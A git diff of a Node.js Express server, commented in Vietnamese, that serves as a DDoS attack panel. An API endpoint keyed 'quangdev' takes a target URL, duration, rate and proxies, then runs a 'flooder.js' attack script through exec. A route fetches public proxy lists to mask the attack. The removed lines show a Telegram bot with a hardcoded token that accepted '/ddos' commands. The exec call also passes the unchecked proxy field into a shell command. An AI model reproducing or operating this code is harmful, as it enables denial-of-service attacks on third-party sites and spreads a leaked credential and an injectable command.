@@ -1,30 +1,18 @@
 const express = require('express');
 const { exec } = require('child_process');
-const axios = require('axios');
-const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
+const axios = require('axios');
 
-// Khởi tạo bot Telegram với token của bạn
-const bot_token = "8152527907:AAFjtXCIPYHTErd9r8us8ScyvCydeL8y6nM"; // Thay bằng token bot của bạn
-const chat_id = "-1002390662783"; // Thay bằng chat ID của bạn
-
-const bot = new TelegramBot(bot_token, { polling: true });
-const app = express();
 const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
+const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@'];
 
+const api_port = 4000; // Cổng API
+const api_key = "quangdev"; // Khóa API của bạn
+
+const app = express();
 app.use(express.json());
 
-// Hàm gửi thông báo Telegram
-const sendTelegramMessage = async (message) => {
-    try {
-        await bot.sendMessage(chat_id, message, { parse_mode: 'Markdown' });
-    } catch (error) {
-        console.error('Lỗi khi gửi tin nhắn Telegram:', error.message);
-    }
-};
-
-// API endpoint để nhận yêu cầu từ API client
-app.get('/api', async (req, res) => {
+app.get(`/api`, async (req, res) => {
     const field = {
         url: req.query.url || undefined,
         time: req.query.time || undefined,
@@ -34,68 +22,54 @@ app.get('/api', async (req, res) => {
         api_key: req.query.api_key || undefined,
     };
 
-    // Kiểm tra API key và các tham số
-    if (field.api_key !== "quangdev") {
-        return res.json({ status: 500, data: 'Khóa API không hợp lệ' });
-    }
+    // Kiểm tra API key
+    if (field.api_key !== api_key) return res.json({ status: 500, data: `Khóa API không hợp lệ` });
 
-    if (!field.url || !urlRegex.test(field.url) || !field.time || isNaN(field.time)) {
-        return res.json({ status: 400, message: "Tham số không hợp lệ. Dùng: /api?url=<url>&time=<time>" });
-    }
+    // Kiểm tra các trường đầu vào
+    const containsBlacklisted = blackList.some(char => field.url.includes(char));
+    if (!field.url || !urlRegex.test(field.url) || containsBlacklisted) return res.json({ status: 500, data: `URL không hợp lệ` });
+    if (!field.time || isNaN(field.time) || field.time > 86400) return res.json({ status: 500, data: `Thời gian cần phải là một số trong khoảng 0-86400` });
+    if (!field.rate || isNaN(field.rate)) return res.json({ status: 500, data: `Rate không hợp lệ` });
+    if (!field.thea || isNaN(field.thea)) return res.json({ status: 500, data: `Thea không hợp lệ` });
+    if (!field.proxy) return res.json({ status: 500, data: `Proxy không được để trống` });
 
-    // Lệnh để gọi flooder.js
-    const command = `node flooder.js ${field.url} ${field.time} 10 10 ${field.proxy}`;
+    // Ghi log URL, thời gian, rate và threading
+    console.log(`Url: ${field.url} Time: ${field.time} Rate: ${field.rate} Threading: ${field.thea} đang thực hiện Start Attack`);
 
-    console.log(`API đang thực hiện DDoS URL: ${field.url} với thời gian: ${field.time} giây`);
+    // Chuẩn bị lệnh gọi tệp flooder.js
+    const command = `node flooder.js ${field.url} ${field.time} ${field.rate} ${field.thea} ${field.proxy}`;
 
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            console.error(`Lỗi khi thực hiện: ${stderr}`);
-            return res.json({ status: 500, message: "Thực thi thất bại" });
+    // Gửi phản hồi trạng thái ban đầu ngay lập tức
+    res.json({
+        status: 200,
+        message: 'Start Attack Success!',
+        data: {
+            url: field.url,
+            time: field.time,
+            rate: field.rate,
+            thea: field.thea,
+            proxy: field.proxy,
         }
-
-        sendTelegramMessage(`*DDoS thành công!*\n🌐 *Host*: ${field.url}\n⏰ *Time*: ${field.time} giây`);
-        return res.json({ status: 200, message: "DDoS thành công!" });
     });
-});
 
-// Lắng nghe các lệnh từ bot Telegram
-bot.onText(/\/ddos (.+) (\d+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const url = match[1]; // Lấy URL từ lệnh
-    const time = match[2]; // Lấy thời gian từ lệnh
-
-    if (!url || !urlRegex.test(url) || !time || isNaN(time)) {
-        bot.sendMessage(chatId, "Tham số không hợp lệ. Dùng: `/ddos <url> <time>`");
-        return;
-    }
-
-    // Gửi thông báo khi bắt đầu tấn công DDoS
-    const message = `*Bot đã nhận yêu cầu DDoS!*\n🌐 *Host*: ${url}\n⏰ *Time*: ${time} giây`;
-    sendTelegramMessage(message);
-
-    const command = `node flooder.js ${url} ${time} 10 10 proxies.txt`;
-
-    // Thực thi lệnh DDoS
+    // Thực thi lệnh sau khi gửi phản hồi
     exec(command, (error, stdout, stderr) => {
         if (error) {
-            console.error(`Bot lỗi khi thực hiện: ${stderr}`);
-            bot.sendMessage(chatId, "Thực thi thất bại!");
+            console.error(`Lỗi: ${stderr}`);
             return;
         }
 
-        console.log(`Kết quả tấn công DDoS: ${stdout}`);
-        bot.sendMessage(chatId, `*DDoS thành công!*:\n🌐 *Host*: ${url}\n⏰ *Time*: ${time} giây\n\n${stdout}`);
+        console.log(`Gửi yêu cầu thành công: ${stdout}`);
     });
 });
 
-// API endpoint để tải proxy tự động
+// Thêm route tải proxy tự động
 app.get('/proxy', async (req, res) => {
     const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
     try {
         const response = await axios.get(proxyUrl);
         fs.writeFileSync('proxies.txt', response.data);
-        console.log(`Đã tải tệp proxy`);
+        console.log(`Đã tải và lưu proxy vào tệp proxies.txt`);
         return res.json({ status: 200, message: "Đã tải proxy thành công" });
     } catch (error) {
         console.error(`Lỗi khi tải proxy: ${error.message}`);
@@ -103,6 +77,4 @@ app.get('/proxy', async (req, res) => {
     }
 });
 
-// Khởi động server Express
-const api_port = 4000;
 app.listen(api_port, () => console.log(`API đã chạy trên cổng ${api_port}`));
